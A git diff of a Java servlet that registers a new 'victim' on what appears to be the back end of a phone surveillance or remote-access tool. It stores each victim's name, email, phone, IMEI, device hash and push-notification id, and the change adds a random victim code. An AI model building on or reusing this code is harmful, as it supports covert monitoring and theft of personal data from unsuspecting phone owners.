@@ -1,10 +1,8 @@
 package com.theah64.xrob.api.servlets;
 
-import com.theah64.xrob.api.database.tables.Clients;
 import com.theah64.xrob.api.database.tables.Victims;
 import com.theah64.xrob.api.models.Victim;
 import com.theah64.xrob.api.utils.APIResponse;
-import com.theah64.xrob.api.utils.JSONUtils;
 import com.theah64.xrob.api.utils.RandomString;
 import com.theah64.xrob.api.utils.Request;
 
@@ -14,7 +12,6 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.io.PrintWriter;
-import java.util.Random;
 
 /**
  * Used to create new victim
@@ -71,7 +68,10 @@ public class INServlet extends BaseServlet {
                 //Preparing new api key for new victim
                 apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);
 
-                final Victim newVictim = new Victim(null, name, email, phone, imei, deviceHash, apiKey, fcmId, deviceName, otherDeviceInfo, null, null, true);
+                final Victim newVictim = new Victim(null, name, email, phone, imei, deviceHash, apiKey, fcmId, deviceName, otherDeviceInfo, null, null, true,
+                        RandomString.getRandomString(Victim.VICTIM_CODE_LENGTH)
+                );
+
                 victimsTable.addv2(newVictim);
 
             } else {
